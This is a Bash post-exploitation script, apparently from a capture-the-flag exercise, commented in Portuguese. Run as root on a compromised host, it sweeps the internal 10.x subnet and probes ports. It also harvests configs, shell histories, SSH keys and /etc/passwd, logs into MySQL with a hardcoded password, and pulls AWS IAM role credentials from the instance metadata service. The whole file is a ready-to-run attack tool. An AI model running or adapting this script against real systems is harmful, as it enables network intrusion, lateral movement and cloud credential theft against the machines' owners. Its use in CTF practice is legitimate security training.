#!/bin/bash
#
# Recon Parte 2 a partir do root na Parte 1 (CTF9)
# Objetivo:
#  - Mapear rede interna 10.x
#  - Descobrir outros hosts/serviços
#  - Coletar possíveis credenciais (incl. AWS metadata)
#  - Gerar um único arquivo de saída pra usar na análise da Parte 2
#

OUTFILE="recon_parte2_$(date +%Y%m%d_%H%M%S).txt"

exec 2>>"$OUTFILE"

log() { echo "[*] $1" | tee -a "$OUTFILE"; }
sec() { echo -e "\n\n==================== $1 ====================\n" | tee -a "$OUTFILE"; }

log "Salvando resultados em: $OUTFILE"
sec "Início: $(date)"

########################
# 1. Infos básicas host
########################
sec "1. Informações básicas do host"

{
  echo "--- hostname ---"
  hostname 2>/dev/null

  echo -e "\n--- uname -a ---"
  uname -a 2>/dev/null

  echo -e "\n--- whoami / id ---"
  whoami 2>/dev/null
  id 2>/dev/null

  echo -e "\n--- /etc/hosts ---"
  cat /etc/hosts 2>/dev/null
} >> "$OUTFILE"

########################
# 2. Rede interna
########################
sec "2. Rede interna (IPs, rotas, ARP)"

{
  echo "--- IPs (hostname -I) ---"
  hostname -I 2>/dev/null

  echo -e "\n--- /proc/net/dev ---"
  cat /proc/net/dev 2>/dev/null

  echo -e "\n--- /sys/class/net ---"
  ls -la /sys/class/net 2>/dev/null

  echo -e "\n--- Rotas (/proc/net/route) ---"
  cat /proc/net/route 2>/dev/null

  echo -e "\n--- /proc/net/arp ---"
  cat /proc/net/arp 2>/dev/null
} >> "$OUTFILE"

# Tentar extrair IP interno principal (10.x) para montar um /24
INTERNAL_IP=$(hostname -I 2>/dev/null | tr ' ' '\n' | grep '^10\.' | head -1)
if [ -n "$INTERNAL_IP" ]; then
  NET_PREFIX=$(echo "$INTERNAL_IP" | awk -F. '{print $1"."$2"."$3}')
  log "IP interno detectado: $INTERNAL_IP (prefixo $NET_PREFIX.0/24)"
else
  log "Nenhum IP 10.x detectado em hostname -I; scan de rede simplificado."
fi

########################
# 3. Conexões ativas
########################
sec "3. Conexões de rede ativas"

{
  echo "--- /proc/net/tcp ---"
  cat /proc/net/tcp 2>/dev/null

  echo -e "\n--- /proc/net/udp ---"
  cat /proc/net/udp 2>/dev/null

  echo -e "\n--- Processos com rede (ps aux | grep -E 'ssh|mysql|nginx|curl|wget|python|php') ---"
  ps aux 2>/dev/null | grep -Ei 'ssh|mysql|nginx|curl|wget|python|php' | grep -v grep
} >> "$OUTFILE"

################################
# 4. Varredura básica da subrede
################################
sec "4. Varredura simples do /24 interno (ping + portas 22/80/443/3306/8080)"

{
  if [ -n "$NET_PREFIX" ]; then
    echo "Subrede alvo: $NET_PREFIX.0/24"
    echo

    for i in $(seq 1 254); do
      IP="$NET_PREFIX.$i"
      # não pingar o próprio IP repetidamente
      if [ "$IP" = "$INTERNAL_IP" ]; then
        continue
      fi

      ping -c1 -W1 "$IP" >/dev/null 2>&1
      if [ $? -eq 0 ]; then
        echo "Host ativo: $IP"

        # Teste rápido de portas via bash /dev/tcp (se suportado)
        for PORT in 22 80 443 3306 8080; do
          timeout 1 bash -c "echo >/dev/tcp/$IP/$PORT" >/dev/null 2>&1
          if [ $? -eq 0 ]; then
            echo "  - Porta $PORT aberta"
          fi
        done
      fi
    done
  else
    echo "Nenhum prefixo 10.x identificado; pulando scan detalhado."
  fi
} >> "$OUTFILE"

################################
# 5. Serviços locais (Apache/MySQL)
################################
sec "5. Serviços locais (Apache, MySQL, etc.)"

{
  echo "--- Processos (ps aux | head -80) ---"
  ps aux | head -80

  echo -e "\n--- Apache config (sites-enabled) ---"
  ls -la /etc/apache2/sites-enabled 2>/dev/null
  for f in /etc/apache2/sites-enabled/*; do
    [ -f "$f" ] && echo ">> $f" && cat "$f"
  done

  echo -e "\n--- /var/www ---"
  ls -la /var/www 2>/dev/null
  echo -e "\n--- /var/www/blogo ---"
  ls -la /var/www/blogo 2>/dev/null
  echo -e "\n--- /var/www/blogo/config ---"
  ls -la /var/www/blogo/config 2>/dev/null
  echo -e "\n--- /var/www/blogo/config/config.php ---"
  cat /var/www/blogo/config/config.php 2>/dev/null

  echo -e "\n--- MySQL (se disponível, info básica) ---"
  mysql --protocol=TCP -h 127.0.0.1 -u blogodb -p'WPcmqw16ZmzO!5paSC4' -e "
    SELECT @@hostname AS host, @@port AS port;
    SHOW DATABASES;
  " 2>/dev/null || echo "(mysql não acessível com blogodb/local)"
} >> "$OUTFILE"

################################
# 6. Logs relevantes
################################
sec "6. Logs relevantes (Apache, abaixo, outros)"

{
  echo "--- /var/log/apache2/access.log (últimas 200 linhas) ---"
  tail -200 /var/log/apache2/access.log 2>/dev/null

  echo -e "\n--- /var/log/apache2/error.log (últimas 100 linhas) ---"
  tail -100 /var/log/apache2/error.log 2>/dev/null

  echo -e "\n--- grep por 'projects-blogo' / '10.0.' / 'internal' em logs Apache ---"
  grep -E "projects-blogo|10\.0\.|internal" /var/log/apache2/*.log 2>/dev/null | tail -80

  echo -e "\n--- /var/log/below (se existir) ---"
  ls -la /var/log/below 2>/dev/null
  for f in /var/log/below/*; do
    [ -f "$f" ] && echo ">> $f" && head -40 "$f"
  done
} >> "$OUTFILE"

################################
# 7. Usuários, homes, SSH
################################
sec "7. Usuários, homes e chaves SSH"

{
  echo "--- /etc/passwd ---"
  cat /etc/passwd 2>/dev/null

  echo -e "\n--- /root ---"
  ls -la /root 2>/dev/null

  echo -e "\n--- /home ---"
  ls -la /home 2>/dev/null

  echo -e "\n--- /root/.ssh ---"
  ls -la /root/.ssh 2>/dev/null
  cat /root/.ssh/authorized_keys 2>/dev/null

  echo -e "\n--- /home/*/.ssh ---"
  for d in /home/*; do
    [ -d "$d/.ssh" ] || continue
    echo ">> $d/.ssh"
    ls -la "$d/.ssh"
    cat "$d/.ssh/authorized_keys" 2>/dev/null
  done

  echo -e "\n--- Históricos de shell (root e usuários) ---"
  cat /root/.bash_history 2>/dev/null
  for d in /home/*; do
    [ -f "$d/.bash_history" ] && echo -e "\n>> $d/.bash_history" && cat "$d/.bash_history"
  done
} >> "$OUTFILE"

################################
# 8. AWS Metadata (se for EC2)
################################
sec "8. AWS Instance Metadata (se disponível)"

{
  echo "--- Testando acesso ao metadata 169.254.169.254 ---"
  curl -s --max-time 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null || echo "(metadata não acessível)"

  ROLE=$(curl -s --max-time 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null | head -1)
  if [ -n "$ROLE" ]; then
    echo -e "\n--- Role IAM detectada: $ROLE ---"
    curl -s --max-time 4 "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" 2>/dev/null
  else
    echo "(nenhuma role IAM retornada ou metadata indisponível)"
  fi
} >> "$OUTFILE"

################################
# 9. Grep geral em /etc e /var/www
################################
sec "9. Grep por hosts internos, projetos e credenciais em /etc e /var/www"

{
  echo "--- /etc (10\\.0\\.|192\\.168\\.|internal|projects|blogo) ---"
  grep -R "10\.0\.|192\.168\.|internal|projects|blogo" /etc 2>/dev/null | head -200

  echo -e "\n--- /var/www (10\\.0\\.|192\\.168\\.|internal|projects|blogo|password|passwd) ---"
  grep -R "10\.0\.|192\.168\.|internal|projects|blogo|password|passwd" /var/www 2>/dev/null | head -200
} >> "$OUTFILE"

################################
# 10. Fim
################################
sec "Fim"
echo "Finalizado: $(date)" >> "$OUTFILE"

log "Concluído."
echo "Arquivo gerado:"
echo "$OUTFILE"